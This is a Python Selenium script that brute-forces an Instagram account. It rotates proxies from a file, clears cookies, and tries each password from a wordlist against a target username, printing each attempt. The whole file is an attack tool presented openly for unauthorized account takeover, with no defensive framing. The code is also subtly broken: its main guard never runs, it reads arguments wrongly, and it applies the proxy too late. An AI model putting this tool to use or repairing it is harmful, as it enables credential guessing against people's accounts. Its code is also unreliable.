from selenium import webdriver 
import argparse
import time
import random


url='https://www.instagram.com/accounts/login/?force_classic_login'
proxies = open("proxies.txt","r")
proxy_list =[]
for _ in proxies:
    proxy_list.append(_)
#"https://instagram.com")

def login(username,password):
    firefox_profile = webdriver.FirefoxProfile()
    firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
    browser = webdriver.Firefox()
    browser.delete_all_cookies()
    print("[+] deleted all cookies")
    prox = random.choice(proxy_list)
    print(f"[+]using proxy:{prox}\n")
    webdriver.DesiredCapabilities.FIREFOX['proxy']={
           "httpProxy":prox,
            "ftpProxy":prox,
            "sslProxy":prox,
            #"noProxy":None,
            "proxyType":"manual"
        }    
    browser.get(url)
    time.sleep(2)
    browser.find_element_by_xpath("//*[@id=\"id_username\"]").clear()
    browser.find_element_by_xpath("//*[@id=\"id_username\"]").send_keys(username)
    browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").send_keys(password)
    try:
        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[3]/input").click()
        return 0
        #time.sleep(5)
    except Exception as e:
        return 1
    
#Not Now
#browser.find_element_by_xpath("/html/body/div[5]/div/div/div/div[3]/button[2]").click()
#time.sleep(5)

#goto dms
#browser.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[3]/div/div[2]/a").click()
#wordlist="" # path to yer workdlist
#username = " " # username here

if '__name__' =='__main__':
    args = argparse.ArgumentParser()
 
    # Adding optional argument
    args.add_argument("-u", "--username", help = "username of the profile")
    args.add_argument("-w", "--wordlist", help = "path to yer wordlist")
    args.add_argument("-h", "--help", help = "\nusage:\npython3 main.py -u <username> -w <wordlist>")
    
    # Read arguments from command line
    args = args.parse_args()
    if args.username and args.wordlist:
        username = argparse.username
        wordlist = argparse.wordlist
 
    passlist = open(wordlist,"r")

    attempt =1
    for password in passlist:
        print(f"\n[+]attempt:{attempt} trying:{password}")
        login(username,password)
        attempt+=1
    